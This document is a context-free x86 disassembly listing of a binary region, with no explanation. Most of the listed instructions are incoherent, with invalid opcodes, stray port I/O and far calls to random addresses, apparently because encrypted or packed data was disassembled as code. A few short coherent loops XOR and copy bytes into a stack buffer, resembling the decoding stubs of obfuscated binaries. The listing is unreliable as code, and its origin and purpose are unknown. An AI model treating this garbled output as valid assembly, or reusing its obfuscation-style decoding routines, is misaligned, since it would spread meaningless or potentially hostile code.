  4031c5:	inc    ebx
  4031c6:	mov    edx,0xf9cf308b
  4031cb:	outs   dx,DWORD PTR ds:[esi]
  4031cc:	ss xchg ebp,eax
  4031ce:	(bad)  
  4031cf:	leave  
  4031d0:	outs   dx,BYTE PTR ds:[esi]
  4031d1:	push   0x20bb5f6c
  4031d6:	xchg   esp,eax
  4031d7:	adc    eax,0xb6310335
  4031dc:	out    dx,eax
  4031dd:	imul   edx,DWORD PTR [ebx-0xe],0xffffff99
  4031e1:	cmp    al,0x4
  4031e3:	sub    al,0x2e
  4031e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031e6:	pop    edi
  4031e7:	lock xor al,0x35
  4031ea:	daa    
  4031eb:	xor    ebx,DWORD PTR [ebx-0x59]
  4031ee:	sbb    eax,DWORD PTR [edx]
  4031f0:	jne    0x403191
  4031f2:	mov    esi,0xe167fdd1
  4031f7:	jbe    0x4031a2
  4031f9:	jle    0x4031e8
  4031fb:	pop    ebx
  4031fc:	cmc    
  4031fd:	and    eax,0x83b18748
  403202:	push   eax
  403203:	mov    bh,0xf6
  403205:	sub    al,0xf0
  403207:	out    dx,eax
  403208:	push   es
  403209:	call   0x8531:0xf845c783
  403210:	pushf  
  403211:	clc    
  403212:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  403219:	or     DWORD PTR ds:0x42ec6f,ecx
  40321f:	mov    eax,DWORD PTR [ebp-0x8]
  403222:	movzx  ecx,WORD PTR ds:0x42ec4b
  403229:	adc    DWORD PTR ds:0x430357,ecx
  40322f:	mov    ecx,0x7510854
  403234:	sub    DWORD PTR ds:0x42e648,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x4302e1,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
  403259:	(bad)  
  40325b:	pop    edi
  40325c:	call   0x7e16:0xd22c300e
  403263:	jle    0x403213
  403265:	jg     0x4032e5
  403267:	jle    0x40327d
  403269:	call   0x1172:0x8ab55ca1
  403270:	cmp    esp,ebp
  403272:	push   edi
  403273:	adc    dh,dh
  403275:	mov    ebp,0x62c7a645
  40327a:	xor    ah,BYTE PTR [eax+0x5adc852e]
  403280:	mov    esp,ss
  403282:	mov    edi,0x2ec49ef6
  403287:	mov    bl,BYTE PTR [esp+ebp*4-0x77e22df5]
  40328e:	pop    ds
  40328f:	jne    0x40321c
  403291:	leave  
  403292:	lods   al,BYTE PTR ds:[esi]
  403293:	pop    edx
  403294:	call   0xe304f56e
  403299:	stos   BYTE PTR es:[edi],al
  40329a:	pop    edx
  40329b:	int    0x76
  40329d:	push   ebx
  40329e:	pushf  
  40329f:	test   BYTE PTR ds:0x5a9b6c07,bl
  4032a5:	add    al,0x67
  4032a7:	xchg   edx,eax
  4032a8:	loop   0x40328f
  4032aa:	pushf  
  4032ab:	ja     0x40323b
  4032ad:	jecxz  0x403312
  4032af:	in     eax,0x74
  4032b1:	mov    al,0xe9
  4032b3:	sbb    ebp,DWORD PTR [esi-0x1ab45ef6]
  4032b9:	add    BYTE PTR [edx+0x3a41e934],ah
  4032bf:	inc    ecx
  4032c0:	aam    0x19
  4032c2:	das    
  4032c3:	pop    ecx
  4032c4:	push   edx
  4032c5:	fisub  WORD PTR [esi]
  4032c7:	pop    es
  4032c8:	punpcklbw mm0,DWORD PTR [ecx]
  4032cb:	jg     0x4032e9
  4032cd:	or     dh,BYTE PTR [ebp+0x44003a5e]
  4032d3:	pop    ebp
  4032d4:	stc    
  4032d5:	xlat   BYTE PTR ds:[ebx]
  4032d6:	push   cs
  4032d7:	outs   dx,BYTE PTR ds:[esi]
  4032d8:	ja     0x4032f5
  4032da:	jb     0x4032cf
  4032dc:	rcr    BYTE PTR ds:0x8a8b9554,0xfc
  4032e3:	push   edx
  4032e4:	jle    0x40330d
  4032e6:	imul   ebx,DWORD PTR [eax+esi*2-0x73],0xadeb9dc
  4032ee:	pop    es
  4032ef:	sbb    eax,0x4f278fd
  4032f4:	sub    ebp,eax
  4032f6:	ss stos BYTE PTR es:[edi],al
  4032f8:	and    al,0x11
  4032fa:	int3   
  4032fb:	ror    BYTE PTR [edx],1
  4032fd:	imul   BYTE PTR [eax+0x551bcced]
  403303:	popf   
  403304:	(bad)  
  403305:	enter  0x85cb,0xdf
  403309:	cs inc eax
  40330b:	pop    edi
  40330c:	xchg   DWORD PTR [esi-0x3dbaa4e9],eax
  403312:	mov    eax,cs
  403314:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403315:	bound  edi,QWORD PTR [ebx+0x72]
  403318:	pop    ebx
  403319:	pop    edi
  40331b:	push   edx
  40331c:	call   0x5312:0x1eb32e85
  403323:	sub    edx,ebx
  403325:	push   esi
  403326:	sbb    eax,0x12ab9266
  40332b:	bswap  esi
  40332d:	fst    QWORD PTR [ebp+0x5c]
  403330:	pop    edi
  403331:	jne    0x4032f9
  403333:	pop    esp
  403334:	dec    ecx
  403335:	mov    ecx,0x865a47ce
  40333a:	jmp    0xb8102334
  40333f:	ss mov ebx,0x80429c98
  403345:	xchg   BYTE PTR [esi-0x57],ah
  403348:	cmp    ch,ch
  40334a:	xor    esp,DWORD PTR [esi-0x34f50c14]
  403350:	xchg   ebx,eax
  403351:	(bad)  
  403352:	aam    0xf6
  403354:	scas   eax,DWORD PTR es:[edi]
  403355:	pop    ecx
  403356:	sub    al,0xa3
  403358:	xor    eax,0xa7caa616
  40335d:	stc    
  40335e:	mov    esp,0xd6bd48b1
  403363:	dec    esi
  403364:	jge    0x4033b6
  403366:	scas   al,BYTE PTR es:[edi]
  403367:	in     eax,dx
  403368:	add    edx,DWORD PTR [eax]
  40336a:	enter  0x41ab,0xf
  40336e:	push   eax
  40336f:	sbb    bh,BYTE PTR [edi+eiz*1+0x7ab580bb]
  403376:	ficom  WORD PTR [edx]
  403378:	nop
  403379:	sbb    al,0xf1
  40337b:	mov    ds:0x98e46c3,eax
  403380:	add    al,BYTE PTR ds:0x58b112c7
  403386:	adc    dl,ah
  403388:	xor    eax,0x3454043c
  40338d:	cmc    
  40338e:	inc    edx
  40338f:	mov    ds:0xe33443f0,al
  403394:	jnp    0x4033e3
  403396:	stc    
  403397:	out    dx,al
  403398:	mov    ds:0xc83a6611,al
  40339d:	sbb    BYTE PTR [eax-0xf5147c7],ah
  4033a3:	xchg   esp,eax
  4033a4:	sub    eax,0x113c6a7b
  4033a9:	les    ebx,FWORD PTR [edi-0x4ebc51e7]
  4033af:	mov    al,0x17
  4033b1:	adc    al,0xe
  4033b3:	mov    al,0xa1
  4033b5:	or     al,0xfa
  4033b7:	xor    BYTE PTR [edi],cl
  4033b9:	and    BYTE PTR [ecx+0x2],dl
  4033bc:	neg    dl
  4033be:	les    ebx,FWORD PTR [esi-0x19e1517]
  4033c4:	mov    ch,0xa0
  4033c6:	xchg   esi,eax
  4033c7:	jle    0x403355
  4033c9:	cld    
  4033ca:	repnz cmp eax,0xbb06b783
  4033d0:	dec    ecx
  4033d1:	sbb    al,0x75
  4033d3:	mov    edi,0x1cb267fd
  4033d8:	ins    BYTE PTR es:[edi],dx
  4033d9:	jle    0x4033ba
  4033db:	xchg   ecx,eax
  4033dc:	xor    DWORD PTR [eax+0x11],esp
  4033df:	(bad)  
  4033e0:	imul   DWORD PTR [eax+0x3c]
  4033e3:	icebp  
  4033e4:	in     eax,0xae
  4033e6:	xor    DWORD PTR [ecx-0x66824c33],esi
  4033ec:	push   edx
  4033ed:	and    ebx,DWORD PTR [ebp-0x1b2cd6fa]
  4033f3:	fstp   DWORD PTR [edi]
  4033f5:	jp     0x403409
  4033f7:	iret   
  4033f8:	jo     0x4033e0
  4033fa:	push   eax
  4033fb:	nop
  4033fc:	in     al,dx
  4033fd:	adc    al,0x44
  4033ff:	(bad)  
  403400:	sti    
  403401:	jge    0x4033da
  403403:	inc    ecx
  403404:	repz adc BYTE PTR [ebx+0x5fe0e76],ch
  40340b:	ins    DWORD PTR es:[edi],dx
  40340c:	jg     0x4033db
  40340e:	cmp    esp,edi
  403410:	adc    DWORD PTR [ebx+0x23],ebx
  403413:	xor    dl,dh
  403415:	add    al,0x6
  403417:	lds    edi,FWORD PTR [esi+0x32729b]
  40341d:	neg    DWORD PTR ds:0x4302d9
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	es pop es
  403454:	xchg   esi,eax
  403455:	retf   
  403456:	add    dl,BYTE PTR [esi+edi*2]
  403459:	jle    0x403409
  40345b:	jg     0x4034db
  40345d:	jle    0x403455
  40345f:	lock xor al,0xf1
  403462:	push   esi
  403463:	(bad)  
  403464:	cmp    BYTE PTR [ecx],dl
  403466:	mov    al,0xcb
  403468:	and    cl,BYTE PTR [edx+0x37]
  40346b:	ret    0x1416
  40346e:	adc    eax,0xaf857774
  403473:	inc    ecx
  403474:	ret    0xc154
  403477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403478:	xchg   ebp,eax
  403479:	ficomp WORD PTR [esi+edi*4]
  40347c:	or     BYTE PTR [edi],cl
  40347e:	inc    eax
  40347f:	fldenv [eax+0x49]
  403482:	push   edi
  403483:	ss ins BYTE PTR es:[edi],dx
  403485:	push   cs
  403486:	hlt    
  403487:	add    DWORD PTR [esi-0x3c],edi
  40348a:	push   0xc70b914c
  40348f:	dec    edi
  403490:	repnz add al,0x59
  403493:	(bad)  
  403494:	jecxz  0x4034cf
  403496:	pop    edx
  403497:	cdq    
  403498:	mov    esp,0xb69c031b
  40349d:	adc    cl,BYTE PTR ds:0x7f972f02
  4034a3:	and    eax,DWORD PTR [eax+0x1775f158]
  4034a9:	sbb    DWORD PTR [edx],0xf091cc9b
  4034af:	xchg   edi,eax
  4034b0:	and    edi,ebp
  4034b2:	rcl    BYTE PTR [edx-0xd],0x14
  4034b6:	inc    eax
  4034b7:	outs   dx,DWORD PTR ds:[esi]
  4034b8:	mov    al,ds:0x6ad67290
  4034bd:	outs   dx,BYTE PTR ds:[esi]
  4034bf:	sti    
  4034c0:	int    0x66
  4034c2:	and    eax,0xaae6bac0
  4034c7:	mov    dl,BYTE PTR [esi]
  4034c9:	inc    eax
  4034ca:	into   
  4034cb:	mov    ecx,DWORD PTR [ecx+0x71]
  4034ce:	inc    ebp
  4034cf:	mov    esi,0x47ba6118
  4034d4:	stc    
  4034d5:	or     DWORD PTR [ebp+0x54],0x3b
  4034d9:	inc    ecx
  4034da:	int3   
  4034db:	sub    BYTE PTR [esi],cl
  4034dd:	cmp    al,0xab
  4034df:	(bad)  
  4034e0:	fidiv  DWORD PTR [edi-0x45]
  4034e3:	in     al,dx
  4034e4:	mov    ecx,DWORD PTR ds:0xc3d8a264
  4034ea:	leave  
  4034eb:	popa   
  4034ec:	or     esi,DWORD PTR [ebp+0x5769e5ec]
  4034f2:	add    eax,0x23196b33
  4034f7:	pop    eax
  4034f8:	loope  0x403506
  4034fa:	jg     0x403570
  4034fc:	inc    ebp
  4034fd:	fwait
  4034fe:	mov    BYTE PTR [esi-0x667f9455],bl
  403504:	int    0x50
  403506:	daa    
  403507:	bound  ebx,QWORD PTR [edx-0x10806801]
  40350d:	cs and eax,0x772dc548
  403513:	inc    ebx
  403514:	nop
  403515:	push   edx
  403516:	inc    ecx
  403517:	mov    ?,WORD PTR [eax]
  403519:	push   0xfffffff1
  40351b:	jl     0x403505
  40351d:	bound  eax,QWORD PTR [ebx]
  40351f:	push   0xffffff88
  403521:	cmp    cl,BYTE PTR gs:[edx+esi*1]
  403525:	push   0xc7b2a663
  40352a:	mov    eax,ds:0xc04cc74b
  40352f:	sbb    edi,DWORD PTR [esi-0x65]
  403532:	mov    esi,0xd22e1f64
  403537:	xchg   ebx,eax
  403538:	(bad)  
  403539:	jge    0x40355d
  40353b:	jge    0x4034f3
  40353d:	lock adc eax,0xd2ef0d7
  403544:	pushf  
  403545:	mov    esp,0x9afc6a76
  40354a:	imul   ecx,DWORD PTR [esi],0x4c772244
  403550:	mov    esi,0x5539c007
  403555:	retf   
  403556:	enter  0xaf73,0x4a
  40355a:	test   ebx,ecx
  40355c:	mov    edi,DWORD PTR [esi+ebx*1-0x5c]
  403560:	lods   eax,DWORD PTR ds:[esi]
  403561:	mov    al,0x4b
  403563:	call   0xff1f:0x530f14f1
  40356a:	mov    esi,0xacd9e1e
  40356f:	dec    esp
  403570:	xchg   ebp,eax
  403571:	int3   
  403572:	loop   0x403557
  403574:	mov    esi,0x301a607b
  403579:	ficomp WORD PTR [ebx-0x613a2614]
  40357f:	test   al,0xd8
  403581:	dec    ecx
  403582:	scas   eax,DWORD PTR es:[edi]
  403583:	in     al,dx
  403584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403585:	push   cs
  403586:	cmp    ebp,esi
  403588:	mov    esi,0xedc254f9
  40358d:	mov    ebx,0x933de1a
  403592:	sbb    DWORD PTR [esi-0x11],esi
  403595:	push   cs
  403596:	push   esi
  403597:	xchg   edi,eax
  403598:	mov    WORD PTR [eax-0x51d45391],ds
  40359e:	adc    eax,0x297bf072
  4035a3:	in     eax,dx
  4035a4:	jl     0x403620
  4035a6:	pop    edi
  4035a7:	inc    esp
  4035a8:	int    0x55
  4035aa:	outs   dx,BYTE PTR ds:[esi]
  4035ab:	add    esp,DWORD PTR [ebx]
  4035ad:	or     al,0x80
  4035af:	fcom   DWORD PTR ss:[edi-0x7b]
  4035b3:	es cmp dl,dl
  4035b6:	iret   
  4035b7:	fcomip st,st(5)
  4035b9:	sub    al,0xef
  4035bb:	mov    ?,WORD PTR [esi]
  4035bd:	mov    bh,0x66
  4035bf:	ret    0x940f
  4035c2:	dec    ecx
  4035c3:	idiv   ah
  4035c5:	neg    DWORD PTR [ecx+0x73]
  4035c8:	test   BYTE PTR [esi-0x1f61f331],ah
  4035ce:	cmp    edi,edx
  4035d0:	add    BYTE PTR [esi],ah
  4035d2:	jmp    0x47f4:0xebd965f0
  4035d9:	cmp    al,ch
  4035db:	push   esp
  4035dc:	push   edi
  4035dd:	sbb    dh,bh
  4035df:	shl    BYTE PTR [eax],0x40
  4035e2:	sub    eax,0x4a4a14d4
  4035e7:	adc    al,0xa2
  4035e9:	jmp    0xd08dce54
  4035ee:	or     eax,0xbe86941c
  4035f3:	outs   dx,BYTE PTR ds:[esi]
  4035f4:	fcmovnb st,st(6)
  4035f6:	(bad)
  4035f9:	sub    BYTE PTR [eax-0x28],bl
  4035fc:	add    DWORD PTR ds:0x11a228bf,esi
  403602:	js     0x4035be
  403604:	out    0xf5,al
  403606:	inc    edx
  403607:	lds    ebp,FWORD PTR [ebp+0x50]
  40360a:	popa   
  40360b:	mov    edi,0xd1331efa
  403610:	add    edx,esi
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0xc33dd7c8
  40366f:	adc    ebp,DWORD PTR [eax+0x62]
  403672:	mov    dl,0x15
  403674:	jle    0x4036f4
  403676:	scas   al,BYTE PTR es:[edi]
  403677:	jg     0x4036f7
  403679:	jle    0x40361c
  40367b:	xchg   esp,eax
  40367c:	inc    eax
  40367d:	daa    
  40367e:	pop    es
  40367f:	mov    edx,0x92b7bd
  403684:	xchg   sp,ax
  403686:	cmp    eax,0xed3304fe
  40368b:	push   eax
  40368c:	or     BYTE PTR [edx],bh
  40368e:	ret    0x85c2
  403691:	jb     0x4036e3
  403693:	out    0x1d,eax
  403695:	cwde   
  403696:	scas   eax,DWORD PTR es:[edi]
  403697:	pusha  
  403698:	lea    ebp,[esi+0x2cc08281]
  40369e:	sar    BYTE PTR [ebx+edi*8-0x76],0xc9
  4036a3:	bound  esi,QWORD PTR [eax]
  4036a5:	xor    eax,0x66d3e33a
  4036aa:	call   0xb54a:0xc15b589
  4036b1:	loopne 0x40363b
  4036b3:	out    0x44,eax
  4036b5:	ror    BYTE PTR [esi],1
  4036b7:	out    0x2c,al
  4036b9:	mov    dl,ch
  4036bb:	sbb    DWORD PTR [edi+0x4331956c],esp
  4036c1:	lods   al,BYTE PTR ds:[esi]
  4036c2:	icebp  
  4036c3:	jmp    0x2132278b
  4036c8:	maxps  xmm4,xmm5
  4036cb:	and    BYTE PTR [edi],al
  4036cd:	sbb    cl,ch
  4036cf:	mov    bl,0xa6
  4036d1:	retf   
  4036d2:	dec    eax
  4036d3:	rol    BYTE PTR [edx+0x49],1
  4036d6:	aas    
  4036d7:	ins    BYTE PTR es:[edi],dx
  4036d8:	jae    0x403706
  4036da:	(bad)  
  4036db:	out    dx,al
  4036dc:	cmp    BYTE PTR [eax-0x70],0x34
  4036e0:	popa   
  4036e1:	mov    ecx,0xa78fd36d
  4036e6:	mov    edi,ds
  4036e8:	xor    DWORD PTR [edi+edi*4-0x1c],ecx
  4036ec:	stc    
  4036ed:	je     0x403759
  4036ef:	call   0xa8bd:0x95444453
  4036f6:	jg     0x4036e0
  4036f8:	ins    BYTE PTR es:[edi],dx
  4036f9:	mov    dl,0x1f
  4036fb:	jbe    0x40369e
  4036fd:	fld    TBYTE PTR [esi]
  4036ff:	test   BYTE PTR [edi-0x63beec86],bh
  403705:	push   es
  403706:	mov    al,0x6e
  403708:	outs   dx,DWORD PTR ds:[esi]
  403709:	cdq    
  40370a:	sub    esp,esi
  40370c:	mov    edi,0x2f20079c
  403711:	dec    esi
  403712:	ret    0x832a
  403715:	call   0x8f70:0x5095dcb5
  40371c:	ins    DWORD PTR es:[edi],dx
  40371d:	jb     0x40372b
  40371f:	pop    ebx
  403720:	out    dx,al
  403721:	call   0xd5839212
  403726:	jbe    0x40371c
  403728:	ror    bl,cl
  40372a:	fmul   QWORD PTR [ebx-0x37]
  40372d:	mov    al,ds:0x124aae38
  403732:	fst    st(0)
  403734:	dec    esp
  403735:	int3   
  403736:	out    dx,eax
  403737:	sti    
  403738:	sub    ebx,0xd8d899b2
  40373e:	loopne 0x403795
  403740:	sbb    dh,BYTE PTR [ebp-0x38]
  403743:	(bad)  
  403745:	xchg   ecx,eax
  403746:	xor    BYTE PTR [ecx+0x246e6aeb],bl
  40374c:	sub    al,bh
  40374e:	jae    0x4037bd
  403750:	shl    BYTE PTR [edi+0x69],1
  403753:	scas   al,BYTE PTR es:[edi]
  403754:	stc    
  403755:	push   eax
  403756:	test   BYTE PTR [ecx+esi*1+0x7a],dh
  40375a:	mov    esi,0xff6b6369
  40375f:	dec    edi
  403760:	imul   ecx,DWORD PTR [edi],0xffffffad
  403763:	pop    ebx
  403764:	lods   eax,DWORD PTR ds:[esi]
  403765:	ss icebp 
  403767:	sti    
  403768:	pop    edx
  403769:	mov    ds:0xbb396bef,al
  40376e:	xchg   edx,eax
  40376f:	xchg   sp,ax
  403771:	push   ebx
  403772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403773:	pop    ds
  403774:	pop    ebp
  403775:	ss fwait
  403777:	inc    esp
  403778:	mov    dl,BYTE PTR [edi]
  40377a:	lods   al,BYTE PTR ds:[esi]
  40377b:	mov    ebp,0x6cba45a9
  403780:	mov    cx,0x2027
  403784:	(bad)  
  403785:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  403787:	xor    DWORD PTR [edi-0x31],esi
  40378a:	ret    
  40378b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40378c:	inc    edx
  40378d:	inc    ebx
  40378e:	(bad)  
  40378f:	push   edx
  403790:	dec    eax
  403791:	pop    ebp
  403792:	ja     0x403720
  403794:	add    eax,0x224dfdfc
  403799:	mov    cl,0xd4
  40379b:	mov    al,ds:0x53c73780
  4037a0:	and    eax,DWORD PTR [esi+0x66e1a531]
  4037a6:	icebp  
  4037a7:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037a9:	ror    BYTE PTR [ecx-0x745251c7],1
  4037af:	aaa    
  4037b0:	sahf   
  4037b1:	jl     0x4037c1
  4037b3:	sahf   
  4037b4:	shl    DWORD PTR [eax+0x38e5d8d8],1
  4037ba:	xor    DWORD PTR [esi-0x4a],edx
  4037bd:	or     ebp,DWORD PTR [eax]
  4037bf:	xchg   ebx,eax
  4037c0:	fimul  DWORD PTR [bp+di+0x4b]
  4037c4:	call   0x6075f4da
  4037c9:	jo     0x403848
  4037cb:	in     eax,0x89
  4037cd:	daa    
  4037ce:	xor    cl,dh
  4037d0:	dec    edi
  4037d1:	pop    ebx
  4037d2:	mov    ebx,0xf183d935
  4037d7:	into   
  4037d8:	hlt    
  4037d9:	inc    esi
  4037da:	ins    BYTE PTR es:[edi],dx
  4037db:	adc    ch,BYTE PTR [eax+0x43]
  4037de:	nop
  4037df:	add    eax,0x370e4fbb
  4037e4:	and    bh,0xe7
  4037e7:	cli    
  4037e8:	push   esi
  4037e9:	sub    BYTE PTR [ecx],ah
  4037eb:	mov    ebp,esp
  4037ed:	int    0xc5
  4037ef:	shr    DWORD PTR [edi],cl
  4037f1:	test   BYTE PTR [edx+ebp*4+0x5f],cl
  4037f5:	(bad)  cs:[edx+0x40]
  4037f9:	xchg   ecx,eax
  4037fa:	stos   DWORD PTR es:[edi],eax
  4037fb:	adc    ebx,DWORD PTR [ebx]
  4037fd:	xor    ch,BYTE PTR [edx+0x3e]
  403800:	jecxz  0x403819
  403802:	xchg   esp,eax
  403803:	and    DWORD PTR [ebx-0x4d],edi
  403806:	cld    
  403807:	shl    dh,cl
  403809:	dec    esi
  40380a:	ror    bh,0x9a
  40380d:	pop    edx
  40380e:	mov    ch,0xc4
  403810:	jb     0x403834
  403812:	pop    ds
  403813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403814:	aas    
  403815:	shl    eax,1
  403817:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  403819:	inc    ecx
  40381a:	push   0x9d603108
  40381f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403820:	push   0x59472e96
  403825:	and    BYTE PTR [ebx],ch
  403827:	in     eax,dx
  403828:	sbb    cl,BYTE PTR [esi]
  40382a:	mov    edx,DWORD PTR [ebp+0x10]
  40382d:	xor    eax,ecx
  40382f:	add    eax,esi
  403831:	jmp    0x4039fe
  403836:	jl     0x403858
  403838:	mov    cl,0xb0
  40383a:	mov    cl,0xb1
  40383c:	jge    0x4037ee
  40383e:	fld    QWORD PTR [edi]
  403840:	call   0xca4eb623
  403845:	adc    eax,0x7e7e13e2
  40384a:	scas   al,BYTE PTR es:[edi]
  40384b:	jg     0x4038cb
  40384d:	jle    0x40389c
  40384f:	lods   eax,DWORD PTR ds:[esi]
  403850:	push   esp
  403851:	mov    esi,0xffa0449a
  403856:	mov    dl,BYTE PTR [ebx]
  403858:	call   0x173a:0xf5bffbef
  40385f:	mov    edx,0x9d736a86
  403864:	fdivr  DWORD PTR [ebx-0x60]
  403867:	enter  0x2309,0x5c
  40386b:	out    dx,al
  40386c:	test   DWORD PTR [eax-0x1b],edx
  40386f:	ds fcmovu st,st(3)
  403872:	test   al,0x67
  403874:	idiv   BYTE PTR [esi+0x37d2f65d]
  40387a:	out    0xcb,eax
  40387c:	push   0xc6dba2c9
  403881:	inc    ecx
  403882:	arpl   WORD PTR [edx-0x52],ax
  403885:	xor    cl,dl
  403887:	int    0x4f
  403889:	xor    DWORD PTR [ecx],ecx
  40388b:	cmp    dh,BYTE PTR [ebx+0x28]
  40388e:	fcom   DWORD PTR [edx]
  403890:	iret   
  403891:	xor    al,0xf2
  403893:	outs   dx,BYTE PTR ds:[esi]
  403894:	adc    DWORD PTR [ebp-0x599ad8f],esp
  40389a:	popa   
  40389b:	adc    edi,esp
  40389d:	xor    BYTE PTR [esi],cl
  40389f:	cdq    
  4038a0:	test   al,0xa8
  4038a2:	jmp    0x40383a
  4038a4:	adc    esp,ebp
  4038a6:	test   bh,ch
  4038a8:	pop    ds
  4038a9:	mov    ebp,0xbfeec715
  4038ae:	ins    BYTE PTR es:[edi],dx
  4038af:	jnp    0x4038ce
  4038b1:	add    al,0x5a
  4038b3:	mov    ch,0x21
  4038b5:	jae    0x4038c5
  4038b7:	pop    ds
  4038b8:	or     DWORD PTR [edx-0x4236dd9e],eax
  4038be:	repnz xor eax,0xe1be471f
  4038c4:	arpl   WORD PTR [eax+0x5f0656f0],bp
  4038ca:	cdq    
  4038cb:	daa    
  4038cc:	mov    ebx,0x483384a7
  4038d1:	xchg   edx,eax
  4038d2:	mov    cl,0x9e
  4038d4:	and    esp,ebx
  4038d6:	inc    edx
  4038d7:	pop    ds
  4038d8:	and    bh,BYTE PTR ds:0xf4266cef
  4038de:	add    DWORD PTR [ecx-0x703c9833],esi
  4038e4:	hlt    
  4038e5:	hlt    
  4038e6:	inc    edx
  4038e7:	cli    
  4038e8:	or     DWORD PTR [edx-0x3d2b7d1a],ecx
  4038ee:	xor    esi,DWORD PTR [ebx-0x1d2bcd7f]
  4038f4:	push   es
  4038f5:	in     eax,0x3
  4038f7:	dec    ecx
  4038f8:	cwde   
  4038f9:	not    BYTE PTR ds:0x7d473e23
  4038ff:	push   edx
  403900:	ror    esp,cl
  403902:	mov    ds:0xdfe68f95,al
  403907:	popa   
  403908:	push   0x1a92348d
  40390d:	dec    edx
  40390e:	xchg   ebx,eax
  40390f:	fwait
  403910:	sbb    ebx,DWORD PTR [ecx+0x48]
  403913:	(bad)  
  403914:	xor    ecx,DWORD PTR [eax]
  403916:	and    al,BYTE PTR [ecx]
  403918:	or     esp,DWORD PTR [ebp+eiz*8+0x5a]
  40391c:	sbb    eax,edx
  40391e:	dec    edi
  40391f:	mov    dh,0x40
  403921:	lods   eax,DWORD PTR ds:[esi]
  403922:	test   al,0x15
  403924:	cs sub bh,ah
  403927:	loop   0x403910
  403929:	push   cs
  40392a:	fbld   TBYTE PTR [edx+ecx*2-0x10310d0]
  403931:	arpl   WORD PTR [ebp+0x48cd1504],di
  403937:	mov    ebx,ds
  403939:	aad    0xa6
  40393b:	add    ch,BYTE PTR [eax]
  40393d:	gs (bad) 
  40393f:	cld    
  403940:	es mov edi,0x159ae320
  403946:	jge    0x40390c
  403948:	push   ebp
  403949:	rcr    BYTE PTR [ebp-0xee7d2b3],cl
  40394f:	sub    eax,DWORD PTR [eax+0x76]
  403952:	dec    eax
  403953:	test   DWORD PTR [ebp-0x7f],0x471d2202
  40395a:	(bad)  [esi+0x62]
  40395d:	jns    0x4039d5
  40395f:	sub    bh,ch
  403961:	or     esi,DWORD PTR [eax]
  403963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403964:	iret   
  403965:	inc    esi
  403966:	and    ebx,DWORD PTR [ebx+0x36]
  403969:	xchg   ah,ch
  40396b:	loope  0x40394f
  40396d:	mov    bl,0xce
  40396f:	popf   
  403970:	adc    eax,0x4f854d66
  403975:	dec    ecx
  403976:	push   eax
  403977:	lahf   
  403978:	sti    
  403979:	xor    al,0x79
  40397c:	aaa    
  40397d:	inc    esi
  40397e:	icebp  
  40397f:	mov    ch,0x70
  403981:	ins    BYTE PTR es:[edi],dx
  403982:	mov    eax,0xa631ec47
  403987:	fild   DWORD PTR [ecx-0x38]
  40398a:	test   BYTE PTR [edi+0x4a29644b],ah
  403990:	xchg   edi,eax
  403991:	lahf   
  403992:	and    al,BYTE PTR [edx-0x36e5324a]
  403998:	sbb    eax,0x54a113bd
  40399d:	xor    ebx,DWORD PTR [edi+0x4cf469f9]
  4039a3:	(bad)  
  4039a4:	xor    edi,DWORD PTR [edi-0x25]
  4039a7:	adc    DWORD PTR [ebp+0x58],0x97c60e8d
  4039ae:	int3   
  4039af:	xor    bh,BYTE PTR [edx-0x36]
  4039b2:	out    dx,al
  4039b3:	cmp    al,0x58
  4039b5:	inc    edx
  4039b6:	addr16 push es
  4039b8:	bound  edx,QWORD PTR [ecx+0x613b4ee8]
  4039be:	in     al,0xd1
  4039c0:	les    ebp,FWORD PTR [ecx]
  4039c2:	jae    0x4039c2
  4039c4:	jo     0x403a0f
  4039c6:	xor    eax,0xb5611c6e
  4039cb:	out    0x43,eax
  4039cd:	sbb    al,0x7b
  4039cf:	jne    0x403a01
  4039d1:	or     DWORD PTR [edi],eax
  4039d3:	jl     0x403978
  4039d5:	push   edx
  4039d6:	sbb    al,0x91
  4039d8:	dec    edx
  4039d9:	ret    
  4039da:	adc    al,0xea
  4039dc:	jg     0x4039ec
  4039de:	repz pop sp
